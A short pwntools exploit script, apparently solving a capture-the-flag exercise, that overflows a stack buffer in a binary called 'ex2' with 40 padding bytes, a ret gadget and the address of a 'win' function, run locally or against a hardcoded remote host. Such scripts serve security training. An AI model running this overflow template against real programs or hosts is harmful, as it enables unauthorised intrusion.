#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./ex2')

host = args.HOST or '34.244.118.165'
port = int(args.PORT or 8885)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *vuln+68
continue
'''.format(**locals())

# -- Exploit goes here --

#win @ 0x4011fb
#ret @ 0x401282
ret_addr = b'\x82\x12\x40\x00\x00\x00\x00\x00'
win_addr=  b'\xfb\x11\x40\x00\x00\x00\x00\x00'
io = start()
var = io.recvuntil(b'\n')
log.success(f'address of win: {hex(exe.sym.win)}')
io.sendline(b'A' * 40 +ret_addr + win_addr )

io.interactive()

